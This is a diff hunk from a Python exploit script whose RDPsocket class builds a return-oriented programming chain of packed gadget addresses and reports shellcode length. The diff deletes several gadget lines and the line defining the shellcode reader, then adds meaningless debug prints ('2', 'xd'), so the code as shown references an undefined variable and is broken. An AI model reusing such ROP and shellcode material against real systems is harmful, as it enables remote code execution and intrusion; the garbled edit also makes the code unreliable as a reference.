@@ -85,14 +85,10 @@ class RDPsocket(socket.socket):
         print "Shellcode length: %d" % len(shellcode)
         parsed += struct.pack(">I", 0x8fe2def4) #add eax,ecx # ret # swap back
         parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx # copy parameter to placeholder
-        parsed += struct.pack(">I", 0x8fe2fb61) #mov [eax],edx # pop eax # ret # set our stack pointer back to original value
-        parsed += struct.pack(">I", 0x8fe0e32d) #xchg eax,edx
-        parsed += struct.pack(">I", 0x8fe2daea) #sub eax,ecx # ret
-        parsed += struct.pack(">I", 0x8fe0b1c2) #xchg eax,ebp # inc ebp # ret
-        parsed += struct.pack(">I", 0x8fe2b6a5) #dec ebp # ret
-        parsed += struct.pack(">I", 0xffff01f3) #mov esp,ebp # pop ebp # ret
-        read = self.table[seeker[0]] #reader for the parsed shellcode/data
 
+        if(1):
+            print("2")
+        print("xd")
         return str(read(shellcode)), parsed
 
     def connect(self, address):
